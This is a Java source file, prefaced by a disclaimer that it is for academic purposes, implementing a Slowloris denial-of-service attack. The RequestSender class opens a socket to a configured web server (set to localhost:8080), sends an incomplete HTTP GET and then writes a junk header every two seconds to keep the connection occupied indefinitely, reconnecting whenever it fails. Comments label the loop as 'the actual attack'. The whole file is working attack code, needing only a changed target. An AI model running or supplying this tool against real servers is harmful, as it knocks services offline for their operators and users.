//This code was written for academic purposes only and never used with maliciuos intentions.
//I'm not responsible for any users actions with this code.


public class RequestSender implements Runnable
{
    private static final int SLEEP_TIME = 2000;
    private static final String HOST = "localhost";
    private static final int PORT = 8080;
    private static final String PATH = "/dashboard/howto.html";

    public void run() 
    {
        System.out.println("Starting thread: " + Thread.currentThread().getName());
        try 
        {
            sendSlowLorisRequest();
        } 
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    private void sendSlowLorisRequest() throws Exception 
    {
        //Creating new socket with tuple (hostname,port)
        Socket socket = new Socket(InetAddress.getByName(HOST), PORT);
        //Creating new bufferWriter for output stream with unicode UTF-8
        BufferedWriter wr = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), "UTF8"));
        //HTTP get request to target machine
        wr.write("GET " + PATH + " HTTP/1.0" + "\r\n");
        wr.flush();

        while (true) 
        {
            //Here is the actual attack
            try 
            {
                //Thread sleeps until the server is just about to give up on the connection because the time limit is almost reached
                //and than writing something to the server again to keep the connection alive.
                //That way the server is stuck with this connection until you stop the program yourself
                Thread.sleep(SLEEP_TIME);
                wr.write("some_header: " + "some_value" + "\r\n");
                wr.flush();
                System.out.println("Send some data from thread: " + Thread.currentThread().getName());
            }
            //Catching exception and starting the attack again
            catch (Exception e) 
            {
                System.out.println(e.getMessage());
                System.out.println("Something went wrong, Reinitializing the socket and sending the request again");
                sendSlowLorisRequest();
            }
        }
    }
}
